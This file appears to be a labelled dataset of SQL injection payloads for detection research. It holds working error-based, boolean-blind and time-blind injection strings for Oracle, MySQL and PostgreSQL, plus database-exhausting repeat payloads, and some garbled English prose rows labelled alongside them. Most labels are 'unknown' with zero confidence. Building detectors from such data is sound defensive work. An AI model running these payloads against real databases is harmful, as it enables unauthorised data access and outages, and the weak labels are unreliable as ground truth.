payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1"" and ""exgr"" like ""exgr",unknown,unknown,function_alternative,0.0,rule,bccc,unknown
"-6523"" and ""bwrb"" like ""bwrb",unknown,unknown,function_alternative,0.0,rule,bccc,unknown
"-8021\' ) ) and ( ( \'cenk' like 'cenk"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'btjx\' = \'btjx",error_based,oracle,case_variation|function_alternative,0.46,rule,bccc,unknown
"-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""bwrb"" like ""bwrb",error_based,oracle,case_variation|function_alternative,0.46,rule,bccc,unknown
-1190' or 4144 = ( sElEct uppEr ( xmltypE ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( sElEct ( casE whEn ( 4144 = 4144 ) thEn 1 ElsE 0 End ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'yxry\' likE 'yxry,error_based,oracle,case_variation|function_alternative,0.46,rule,bccc,unknown
-1190\' or \'yxry\' like 'yxry,unknown,unknown,function_alternative,0.0,rule,bccc,unknown
x' or full_name like '%bob%,unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,like_clause
' or 'something' like 'some%',boolean_blind,unknown,function_alternative,0.8,rule,sqliv5_csv,unknown
' or username like '%,unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,like_clause
' or uname like '%,unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,like_clause
' or userid like '%,unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,like_clause
' or uid like '%,unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,like_clause
' or user like '%,unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,like_clause
"Earlier research revealed happy dogs wag tails right (from dog 's point view), nervous dogs left-dominated swish",unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,unknown
""" When animals saw otherwise expressionless dog move tail right (from tail-wagging dog 's point view), stayed perfectly relaxed",unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,unknown
"But spotted tail veer predominantly left (again tail-swishing dog 's point view), heart rates picked looked anxious",unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,unknown
"They best names , like "" Terror Behind Walls "" (which , way actual prison), "" Howl-O-Scream "" "" The House Shock",unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,unknown
""" In fact , 1,200 officially sanctioned haunted houses United States generating $ 500 million revenue , according America Haunts , includes awesome photos mid-peeing pants friend puts Facebook 't take guy like sees photo leaves comment like "" nice face",unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,unknown
We 're frankly tired feeling like ' hall monitors ' comes issue,unknown,unknown,function_alternative,0.0,rule,sqliv5_csv,unknown
"1 ) as clye where 7842 = 7842 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) and ( 5452 = 6050 ) *6050 and ( ""ciyc"" like ""ciyc",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1'|| ( select 'rawn' from dual where 4988 = 4988 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) ||'",boolean_blind,oracle,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'fbsi' like 'fbsi",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and 'uwep' = 'uwep",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""pawh"" = ""pawh",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1 ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 8929 = 8929",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"end and ( ( ""rqay"" like ""rqay",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 4142 = 4142",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1%' ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"end and ( ""qkkn"" like ""qkkn",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" ) where 6671 = 6671 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""eevk"" = ""eevk",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
select pg_sleep ( 5 ) and ( ( 'enpn' like 'enpn,time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
-8665' or 6825 = 7840 and 'vbsy' like 'vbsy,boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""cdnc"" like ""cdnc",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""tfok"" like ""tfok",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'kwhs' like 'kwhs",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
